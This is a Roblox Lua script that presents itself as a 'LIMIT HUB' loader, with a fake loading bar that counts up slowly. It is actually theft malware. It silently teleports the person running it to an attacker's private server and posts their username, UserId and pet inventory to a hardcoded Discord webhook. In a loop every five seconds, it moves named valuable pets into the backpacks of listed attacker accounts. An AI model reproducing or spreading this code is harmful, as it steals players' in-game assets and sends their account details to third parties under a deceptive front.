-- ✅ FINAL REVENGE SCRIPT - DELTA COMPATIBLE
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

-- ✅ CONFIG
local privatePlaceId = 126884695634066
local privateServerCode = "40206718588419987554943106780552"
local webhookUrl = "https://discord.com/api/webhooks/1396132755925897256/pZu4PMfjQGx64urPAqCckF8aXKFHqAR9vOYW-24C-lurbF5RaCEyqMXGNH7S6l5oe3sz"
local attackerUsernames = {"boneblossom215", "beanstalk1251", "burningbud709"}
local validPets = {
    ["Trex"] = true, ["Fennec Fox"] = true, ["Raccoon"] = true,
    ["Dragonfly"] = true, ["Butterfly"] = true, ["Queenbee"] = true,
    ["Spinosaurus"] = true, ["Redfox"] = true, ["Brontosaurus"] = true,
    ["Mooncat"] = true, ["Mimic Octopus"] = true, ["Disco Bee"] = true,
    ["Dilophosaurus"] = true, ["Kitsune"] = true
}

-- ✅ AUTO TELEPORT TO PRIVATE SERVER
if game.PrivateServerId == "" or game.PrivateServerOwnerId == 0 then
    TeleportService:TeleportToPrivateServer(privatePlaceId, privateServerCode, {LocalPlayer})
    return
end

-- ✅ LIMIT HUB GUI
local gui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
gui.Name = "LIMIT_GUI"
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false

local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 300, 0, 100)
frame.Position = UDim2.new(0.5, -150, 0.5, -50)
frame.BackgroundColor3 = Color3.new(0, 0, 0)

local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, 0, 0.3, 0)
title.Position = UDim2.new(0, 0, 0, 10)
title.Text = "LIMIT HUB"
title.Font = Enum.Font.SciFi
title.TextScaled = true
title.TextColor3 = Color3.fromRGB(0, 255, 255)
title.BackgroundTransparency = 1

local loading = Instance.new("TextLabel", frame)
loading.Size = UDim2.new(1, 0, 0.5, 0)
loading.Position = UDim2.new(0, 0, 0.4, 0)
loading.Text = "Loading... 0%"
loading.Font = Enum.Font.SciFi
loading.TextScaled = true
loading.TextColor3 = Color3.fromRGB(0, 255, 255)
loading.BackgroundTransparency = 1

task.spawn(function()
    for i = 5, 100, 5 do
        loading.Text = "Loading... " .. i .. "%"
        task.wait(10)
    end
end)

-- ✅ DISCORD WEBHOOK REPORT
task.spawn(function()
    local pets = {}
    for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
        if tool:IsA("Tool") then table.insert(pets, tool.Name) end
    end
    for _, tool in ipairs(LocalPlayer.Character:GetChildren()) do
        if tool:IsA("Tool") then table.insert(pets, tool.Name) end
    end

    local data = {
        content = "**🎯 Target Joined Private Server**",
        embeds = {{
            title = "🎒 Inventory - " .. LocalPlayer.Name,
            color = 65280,
            fields = {
                {name = "UserId", value = tostring(LocalPlayer.UserId), inline = true},
                {name = "Pets", value = #pets > 0 and table.concat(pets, "\n") or "No pets found"}
            }
        }}
    }

    pcall(function()
        request({
            Url = webhookUrl,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end)
end)

-- ✅ AUTO PET TRANSFER TO ATTACKERS
task.spawn(function()
    local function getAttacker()
        for _, plr in ipairs(Players:GetPlayers()) do
            if table.find(attackerUsernames, plr.Name) then return plr end
        end
        return nil
    end

    local function transferPets()
        local attacker = getAttacker()
        if not attacker then return end
        local attackerBackpack = attacker:FindFirstChildOfClass("Backpack")
        if not attackerBackpack then return end

        local containers = {LocalPlayer.Backpack, LocalPlayer.Character}
        for _, container in ipairs(containers) do
            for _, item in ipairs(container:GetChildren()) do
                if item:IsA("Tool") then
                    for petName in pairs(validPets) do
                        if string.find(item.Name, petName) then
                            item.Parent = attackerBackpack
                        end
                    end
                end
            end
        end
    end

    while true do
        pcall(transferPets)
        task.wait(5)
    end
end)
